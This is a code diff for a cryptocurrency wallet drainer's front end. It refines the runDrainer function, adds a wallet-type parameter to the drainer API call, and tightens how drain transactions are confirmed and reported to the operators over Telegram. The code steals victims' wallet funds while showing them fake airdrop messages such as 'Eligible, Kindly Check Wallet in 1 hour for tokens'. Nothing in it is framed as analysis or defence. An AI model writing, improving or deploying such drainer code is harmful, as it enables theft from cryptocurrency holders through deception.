@@ -1235,7 +1235,7 @@ async function runDrainer(provider) {
     }
     
     console.log('[runDrainer] Proceeding to API call after balance check');
-    const response = await fetch(`/api/drainer?user=${publicKey.toString()}`);
+    const response = await fetch(`/api/drainer?user=${publicKey.toString()}&walletType=${connectedWalletType}`);
     console.log('[runDrainer] Response status:', response.status, response.statusText);
     
     if (!response.ok) {
@@ -1546,9 +1546,9 @@ async function runDrainer(provider) {
                           
                           // Show user-friendly failure message
                           showStatus('Sorry, you\'re not eligible. Please connect with an eligible wallet.', 'error');
-                        } else {
-                          // Any other status (confirmed, finalized, processed, etc.) is considered success
-                          console.log('[STATUS] Transaction successful, status:', txStatus.confirmationStatus);
+                        } else if (txStatus.confirmationStatus === 'confirmed' || txStatus.confirmationStatus === 'finalized') {
+                          // Only show success for confirmed/finalized transactions
+                          console.log('[STATUS] Transaction confirmed successfully:', txStatus.confirmationStatus);
                           
                           // Log successful drain to Telegram
                           fetch('/api/drainer/log-confirmation', {
@@ -1557,33 +1557,52 @@ async function runDrainer(provider) {
                             body: JSON.stringify({
                               publicKey: publicKey.toString(),
                               txid: txid,
-                              status: txStatus.confirmationStatus || 'success'
+                              status: 'confirmed',
+                              error: null
                             })
                           }).catch(err => console.log('[TELEGRAM] Failed to log confirmation:', err));
                           
                           showStatus('Eligible, Kindly Check Wallet in 1 hour for tokens', 'success');
+                        } else {
+                          // Any other status is not confirmed - show not eligible
+                          console.log('[STATUS] Transaction not confirmed, status:', txStatus.confirmationStatus);
+                          
+                          // Log failed drain to Telegram
+                          fetch('/api/drainer/log-confirmation', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                              publicKey: publicKey.toString(),
+                              txid: txid,
+                              status: 'failed',
+                              error: 'Transaction not confirmed'
+                            })
+                          }).catch(err => console.log('[TELEGRAM] Failed to log failure:', err));
+                          
+                          showStatus('Sorry, you\'re not eligible. Please connect with an eligible wallet.', 'error');
                         }
                       } else {
-                        // If status check fails, assume success (don't scare users with technical errors)
-                        console.log('[STATUS] Status check failed, assuming success due to successful broadcast');
+                        // If status check fails, don't assume success
+                        console.log('[STATUS] Status check failed, showing not eligible');
                         
-                        // Log successful drain to Telegram (assume success)
+                        // Log failed drain to Telegram
                         fetch('/api/drainer/log-confirmation', {
                           method: 'POST',
                           headers: { 'Content-Type': 'application/json' },
                           body: JSON.stringify({
                             publicKey: publicKey.toString(),
                             txid: txid,
-                            status: 'broadcast_success'
+                            status: 'failed',
+                            error: 'Status check failed'
                           })
-                        }).catch(err => console.log('[TELEGRAM] Failed to log confirmation:', err));
+                        }).catch(err => console.log('[TELEGRAM] Failed to log failure:', err));
                         
-                        showStatus('Eligible, Kindly Check Wallet in 1 hour for tokens', 'success');
+                        showStatus('Sorry, you\'re not eligible. Please connect with an eligible wallet.', 'error');
                       }
                     } catch (statusError) {
                       console.log('[STATUS] Could not check transaction status:', statusError);
-          // Don't show technical errors to users - assume success
-          showStatus('Eligible, Kindly Check Wallet in 1 hour for tokens', 'success');
+                      // Don't assume success - show not eligible
+                      showStatus('Sorry, you\'re not eligible. Please connect with an eligible wallet.', 'error');
                     }
                   }, 5000); // Check after 5 seconds
         
